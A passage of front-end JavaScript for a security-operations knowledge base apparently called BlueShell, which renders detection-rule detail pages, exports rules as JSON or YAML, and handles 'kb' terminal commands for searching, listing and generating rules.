    html += `</div><div style="margin-top:24px"><button class="btn-hack" onclick="goHome()">◂ BACK TO DASHBOARD</button></div>`;
    content.innerHTML = html;
    const si = document.getElementById('kb-search-input');
    if (si && !query) si.focus();
}

// Smart search with framework filter
function filterKB(filter) {
    if (filter === 'Enterprise') {
        const results = ruleDatabase.filter(r => r.framework !== 'ICS');
        renderFilteredResults(results, 'IT/Enterprise');
    } else if (filter === 'ICS') {
        const results = ruleDatabase.filter(r => r.framework === 'ICS');
        renderFilteredResults(results, 'ICS/OT');
    } else {
        renderKnowledgeBase(filter);
    }
}

function renderFilteredResults(results, label) {
    // Reuse renderKnowledgeBase logic but with pre-filtered results
    renderKnowledgeBase(label === 'ICS/OT' ? 'ICS' : '');
}

let searchTimeout;
function debounceSearch(query) {
    clearTimeout(searchTimeout);
    searchTimeout = setTimeout(() => renderKnowledgeBase(query), 200);
}

// Generate and display a custom rule
function generateAndShowRule(term) {
    const generated = ruleTemplates.generateRule(term);
    if (generated) {
        // Temporarily add to database so showRuleDetail works
        ruleDatabase.push(generated);
        showRuleDetail(generated.id);
    }
}


// ═══════════════════════════════════════════════════════════════════════════
// RULE DETAIL PAGE - Full SOC Package View
// ═══════════════════════════════════════════════════════════════════════════

function showRuleDetail(ruleId) {
    const rule = ruleDatabase.find(r => r.id === ruleId);
    if (!rule) return;

    const content = document.getElementById('page-content');
    const meta = categoryMeta[rule.category] || { icon: '◈', color: 'var(--accent)' };
    const sevClass = s => s==='Critical'?'kb-sev-critical':s==='High'?'kb-sev-high':s==='Medium'?'kb-sev-medium':'kb-sev-low';
    const fwBadge = rule.framework === 'ICS' ? '<span style="color:#ff6b35;font-size:10px;border:1px solid #ff6b35;padding:2px 6px;border-radius:2px;margin-left:8px">ICS/OT</span>' : '<span style="color:#00d4ff;font-size:10px;border:1px solid #00d4ff;padding:2px 6px;border-radius:2px;margin-left:8px">ENTERPRISE</span>';
    const genBadge = rule.isGenerated ? '<span style="color:var(--accent);font-size:10px;border:1px solid var(--accent);padding:2px 6px;border-radius:2px;margin-left:8px">AUTO-GENERATED</span>' : '';

    const platforms = Object.keys(rule.queries);
    const platformTabs = platforms.map((p, i) =>
        `<button class="kb-tab ${i===0?'kb-tab-active':''}" onclick="switchQueryTab('${p}',this)">${p.toUpperCase()}</button>`
    ).join('');
    const queryPanels = platforms.map((p, i) =>
        `<pre class="kb-query-block ${i===0?'':'hidden'}" id="query-${p}"><code>${escapeHtml(rule.queries[p])}</code></pre>`
    ).join('');

    // TP/FP Analysis section
    const tpfp = rule.tpAnalysis || {};
    const tpItems = (tpfp.truePositive||[]).map(t => `<li style="color:#ff3333">${t}</li>`).join('');
    const fpItems = (tpfp.falsePositive||[]).map(f => `<li style="color:var(--accent)">${f}</li>`).join('');

    // SOAR section
    const soar = rule.soarAutomation || {};

    content.innerHTML = `
        <div class="kb-detail">
            <div class="kb-detail-nav">
                <button class="btn-hack" onclick="renderKnowledgeBase()">◂ BACK TO KNOWLEDGE BASE</button>
                <span class="kb-breadcrumb">${rule.category} / ${rule.id}</span>
            </div>

            <div class="kb-detail-header" style="border-left-color:${meta.color}">
                <div class="kb-detail-title-row">
                    <h1>${rule.name}</h1>
                    <span class="kb-rule-sev ${sevClass(rule.severity)}" style="font-size:12px;padding:4px 12px">${rule.severity.toUpperCase()}</span>
                    ${fwBadge}${genBadge}
                </div>
                <div class="kb-detail-meta">
                    <span class="kb-meta-item"><strong>ID:</strong> ${rule.id}</span>
                    <span class="kb-meta-item"><strong>MITRE:</strong> ${rule.mitre.technique} - ${rule.mitre.name}</span>
                    <span class="kb-meta-item"><strong>Tactic:</strong> ${rule.mitre.tactic} (${rule.category})</span>
                    <span class="kb-meta-item"><strong>Framework:</strong> ${rule.framework || 'Enterprise'}</span>
                </div>
            </div>

            <div class="kb-section">
                <div class="kb-section-title">⟦ DESCRIPTION ⟧</div>
                <p class="kb-description">${rule.description}</p>
            </div>

            <div class="kb-section">
                <div class="kb-section-title">⟦ REQUIRED DATA SOURCES ⟧</div>
                <div class="kb-tags">${rule.dataSources.map(ds => `<span class="kb-ds-tag">${ds}</span>`).join('')}</div>
            </div>

            <div class="kb-section">
                <div class="kb-section-title">⟦ DETECTION QUERIES — ${platforms.length} PLATFORMS ⟧</div>
                <div class="kb-tab-bar">${platformTabs}<button class="kb-copy-btn" onclick="copyActiveQuery()">⧉ COPY</button></div>
                <div class="kb-query-container">${queryPanels}</div>
            </div>

            <div class="kb-section">
                <div class="kb-section-title" style="color:#ff3333;border-color:#ff3333">⟦ TRUE POSITIVE vs FALSE POSITIVE ANALYSIS ⟧</div>
                <div style="display:grid;grid-template-columns:1fr 1fr;gap:12px">
                    <div style="background:rgba(255,51,51,0.05);border:1px solid rgba(255,51,51,0.2);border-radius:4px;padding:12px">
                        <div style="color:#ff3333;font-size:11px;font-weight:700;letter-spacing:2px;margin-bottom:8px">✦ TRUE POSITIVE INDICATORS</div>
                        <ul class="kb-list" style="font-size:11px">${tpItems}</ul>
                        ${tpfp.tpIndicators ? `<div style="margin-top:8px;padding:8px;background:rgba(255,51,51,0.08);border-radius:3px;font-size:10px;color:var(--text-secondary)"><strong style="color:#ff3333">Key TP Signals:</strong> ${tpfp.tpIndicators}</div>` : ''}
                    </div>
                    <div style="background:rgba(0,255,65,0.05);border:1px solid rgba(0,255,65,0.2);border-radius:4px;padding:12px">
                        <div style="color:var(--accent);font-size:11px;font-weight:700;letter-spacing:2px;margin-bottom:8px">✦ FALSE POSITIVE INDICATORS</div>
                        <ul class="kb-list" style="font-size:11px">${fpItems}</ul>
                        ${tpfp.fpIndicators ? `<div style="margin-top:8px;padding:8px;background:rgba(0,255,65,0.08);border-radius:3px;font-size:10px;color:var(--text-secondary)"><strong style="color:var(--accent)">Key FP Signals:</strong> ${tpfp.fpIndicators}</div>` : ''}
                    </div>
                </div>
                ${tpfp.investigationSteps ? `<div style="margin-top:12px;background:var(--bg-card);border:1px solid var(--border);border-left:3px solid var(--accent-blue);padding:12px;border-radius:0 4px 4px 0">
                    <div style="color:var(--accent-blue);font-size:11px;font-weight:700;letter-spacing:2px;margin-bottom:6px">▸ INVESTIGATION STEPS (TP/FP DETERMINATION)</div>
                    <pre class="kb-playbook-pre" style="font-size:11px">${tpfp.investigationSteps}</pre>
                </div>` : ''}
            </div>

            <div class="kb-section">
                <div class="kb-section-title" style="color:var(--accent-purple);border-color:var(--accent-purple)">⟦ SOAR AUTOMATION PLAYBOOK ⟧</div>
                <div style="background:var(--bg-card);border:1px solid var(--border);border-radius:4px;padding:14px">
                    <div style="color:var(--accent);font-size:11px;font-weight:700;margin-bottom:8px">▸ AUTO-ACTIONS (Execute Immediately)</div>
                    <ul class="kb-list" style="font-size:11px">${(soar.autoActions||[]).map(a => `<li>${a}</li>`).join('')}</ul>
                    <div style="color:var(--accent-yellow);font-size:11px;font-weight:700;margin:12px 0 8px">▸ CONDITIONAL ACTIONS (Decision-Based)</div>
                    <ul class="kb-list" style="font-size:11px">${(soar.conditionalActions||[]).map(a => `<li style="color:var(--accent-yellow)">${a}</li>`).join('')}</ul>
                    ${soar.playbookFlow ? `<div style="margin-top:12px;padding:8px;background:rgba(168,85,247,0.1);border:1px solid rgba(168,85,247,0.3);border-radius:3px;font-size:11px;color:var(--text-secondary)"><strong style="color:var(--accent-purple)">SOAR Flow:</strong> ${soar.playbookFlow}</div>` : ''}
                </div>
            </div>

            <div class="kb-section">
                <div class="kb-section-title">⟦ RESPONSE PLAYBOOK ⟧</div>
                <div class="kb-playbook">
                    <div class="kb-playbook-phase"><div class="kb-phase-header kb-phase-detect">▸ DETECTION</div><div class="kb-phase-body">${rule.playbook.detection}</div></div>
                    <div class="kb-playbook-phase"><div class="kb-phase-header kb-phase-contain">▸ CONTAINMENT</div><div class="kb-phase-body"><pre class="kb-playbook-pre">${rule.playbook.containment}</pre></div></div>
                    <div class="kb-playbook-phase"><div class="kb-phase-header kb-phase-eradicate">▸ ERADICATION</div><div class="kb-phase-body"><pre class="kb-playbook-pre">${rule.playbook.eradication}</pre></div></div>
                    <div class="kb-playbook-phase"><div class="kb-phase-header kb-phase-recover">▸ RECOVERY</div><div class="kb-phase-body"><pre class="kb-playbook-pre">${rule.playbook.recovery}</pre></div></div>
                </div>
            </div>

            <div class="kb-section">
                <div class="kb-section-title">⟦ SECURITY POLICY ⟧</div>
                <div class="kb-policy">${rule.policy}</div>
            </div>

            <div class="kb-section">
                <div class="kb-section-title" style="color:var(--accent-red);border-color:var(--accent-red)">⟦ ATTACK PAYLOAD EXAMPLES ⟧</div>
                <pre class="kb-payload-block"><code>${escapeHtml(rule.payload)}</code></pre>
            </div>

            <div class="kb-section">
                <div class="kb-section-title">⟦ SOC USE CASES ⟧</div>
                <div class="kb-usecases">${rule.useCases.map((uc,i) => `
                    <div class="kb-usecase-item"><span class="kb-uc-num">${String(i+1).padStart(2,'0')}</span><span class="kb-uc-text">${uc}</span></div>`).join('')}
                </div>
            </div>

            <div class="kb-section">
                <div class="kb-section-title">⟦ REFERENCES ⟧</div>
                <ul class="kb-list kb-refs">${rule.references.map(ref => `<li>${ref}</li>`).join('')}</ul>
            </div>

            <div class="kb-detail-bottom">
                <button class="btn-hack" onclick="renderKnowledgeBase()">◂ KNOWLEDGE BASE</button>
                <button class="btn-hack" onclick="exportRuleJSON('${rule.id}')">⬇ JSON</button>
                <button class="btn-hack" onclick="exportRuleYAML('${rule.id}')">⬇ YAML</button>
            </div>
        </div>`;

    document.getElementById('content').scrollTop = 0;
}


// ── Utilities ──
function switchQueryTab(platform, btn) {
    document.querySelectorAll('.kb-query-block').forEach(el => el.classList.add('hidden'));
    document.getElementById('query-' + platform).classList.remove('hidden');
    document.querySelectorAll('.kb-tab').forEach(el => el.classList.remove('kb-tab-active'));
    btn.classList.add('kb-tab-active');
}

function copyActiveQuery() {
    const v = document.querySelector('.kb-query-block:not(.hidden)');
    if (v) { navigator.clipboard.writeText(v.textContent).then(() => showToast('Query copied to clipboard')); }
}

function exportRuleJSON(id) {
    const rule = ruleDatabase.find(r => r.id === id);
    if (!rule) return;
    const blob = new Blob([JSON.stringify(rule, null, 2)], { type: 'application/json' });
    downloadBlob(blob, `${rule.id}_${rule.name.replace(/\s+/g,'_')}.json`);
    showToast('Exported as JSON');
}

function exportRuleYAML(id) {
    const rule = ruleDatabase.find(r => r.id === id);
    if (!rule) return;
    let y = `# BlueShell SOC Knowledge Base - Rule Export\nid: ${rule.id}\nname: "${rule.name}"\ncategory: ${rule.category}\nseverity: ${rule.severity}\nframework: ${rule.framework||'Enterprise'}\nmitre:\n  tactic: ${rule.mitre.tactic}\n  technique: ${rule.mitre.technique}\n  name: "${rule.mitre.name}"\ndescription: |\n  ${rule.description}\ndata_sources:\n${rule.dataSources.map(d=>`  - "${d}"`).join('\n')}\n`;
    y += `queries:\n`;
    Object.entries(rule.queries).forEach(([p,q]) => { y += `  ${p}: |\n    ${q.replace(/\n/g,'\n    ')}\n`; });
    y += `tp_analysis:\n  true_positive:\n${(rule.tpAnalysis?.truePositive||[]).map(t=>`    - "${t}"`).join('\n')}\n  false_positive:\n${(rule.tpAnalysis?.falsePositive||[]).map(f=>`    - "${f}"`).join('\n')}\n`;
    y += `soar_automation:\n  auto_actions:\n${(rule.soarAutomation?.autoActions||[]).map(a=>`    - "${a}"`).join('\n')}\n`;
    const blob = new Blob([y], { type: 'text/yaml' });
    downloadBlob(blob, `${rule.id}_${rule.name.replace(/\s+/g,'_')}.yaml`);
    showToast('Exported as YAML');
}

function downloadBlob(blob, filename) {
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url; a.download = filename;
    document.body.appendChild(a); a.click();
    document.body.removeChild(a); URL.revokeObjectURL(url);
}

function showToast(msg) {
    const existing = document.querySelector('.rb-toast');
    if (existing) existing.remove();
    const toast = document.createElement('div');
    toast.className = 'rb-toast'; toast.textContent = msg;
    document.body.appendChild(toast);
    setTimeout(() => toast.remove(), 2500);
}

// ── Terminal KB command handler ──
function handleKBTerminalCommand(args) {
    if (!args || args.length === 0) {
        return `<span class="output">SOC Knowledge Base Commands:
  kb search &lt;term&gt;  - Search rules
  kb list            - List all rules
  kb show &lt;id&gt;      - Show rule detail
  kb categories      - List categories
  kb generate &lt;term&gt; - Generate custom rule
  kb ics             - List ICS/OT rules
  kb stats           - Show statistics</span>`;
    }
    const subcmd = args[0].toLowerCase();
    if (subcmd === 'list') return '<span class="output">Rules:\n' + ruleDatabase.filter(r=>!r.isGenerated).map(r => `  [${r.id}] ${r.name} (${r.severity})`).join('\n') + '</span>';
    if (subcmd === 'ics') return '<span class="output">ICS/OT Rules:\n' + ruleDatabase.filter(r=>r.framework==='ICS').map(r => `  [${r.id}] ${r.name} (${r.severity})`).join('\n') + '</span>';
    if (subcmd === 'categories') {
        const cats = [...new Set(ruleDatabase.map(r=>r.category))];
        return '<span class="output">Categories:\n' + cats.map(c => `  ${categoryMeta[c]?.icon||'◈'} ${c} (${ruleDatabase.filter(r=>r.category===c).length})`).join('\n') + '</span>';
    }
    if (subcmd === 'stats') {
        const enterprise = ruleDatabase.filter(r=>r.framework!=='ICS').length;
        const ics = ruleDatabase.filter(r=>r.framework==='ICS').length;
        const platforms = [...new Set(ruleDatabase.flatMap(r=>Object.keys(r.queries)))];
        return `<span class="output">SOC Knowledge Base Statistics:
  Total Rules: ${ruleDatabase.length}
  Enterprise: ${enterprise} | ICS/OT: ${ics}
  Platforms: ${platforms.join(', ')}
  + Smart Rule Generator for unlimited custom rules</span>`;
    }
    if (subcmd === 'search' && args.length > 1) {
        const q = args.slice(1).join(' ');
        const results = searchRules(q);
        if (results.length === 0) return `<span class="error">No rules found. Use 'kb generate ${q}' to auto-generate.</span>`;
        return '<span class="output">Results for "' + q + '":\n' + results.map(r => `  [${r.id}] ${r.name} (${r.severity})`).join('\n') + '</span>';
    }
    if (subcmd === 'show' && args.length > 1) {
        const id = args[1].toUpperCase();
        const rule = ruleDatabase.find(r => r.id === id);
        if (!rule) return `<span class="error">Rule not found: ${id}</span>`;
        return `<span class="output">[${rule.id}] ${rule.name}
Category: ${rule.category} | Severity: ${rule.severity} | Framework: ${rule.framework||'Enterprise'}
MITRE: ${rule.mitre.technique} - ${rule.mitre.name}
Platforms: ${Object.keys(rule.queries).join(', ')}
Open GUI for full details with TP/FP analysis and SOAR automation</span>`;
    }
    if (subcmd === 'generate' && args.length > 1) {
        const term = args.slice(1).join(' ');
        const gen = ruleTemplates.generateRule(term);
        if (gen) {
            ruleDatabase.push(gen);
            return `<span class="output">[GENERATED] ${gen.id} - ${gen.name}
Category: ${gen.category} | Severity: ${gen.severity}
Platforms: ${Object.keys(gen.queries).join(', ')}
Use 'kb show ${gen.id}' or open in GUI for full details</span>`;
        }
    }
    return `<span class="error">Unknown command. Type 'kb' for help.</span>`;
}
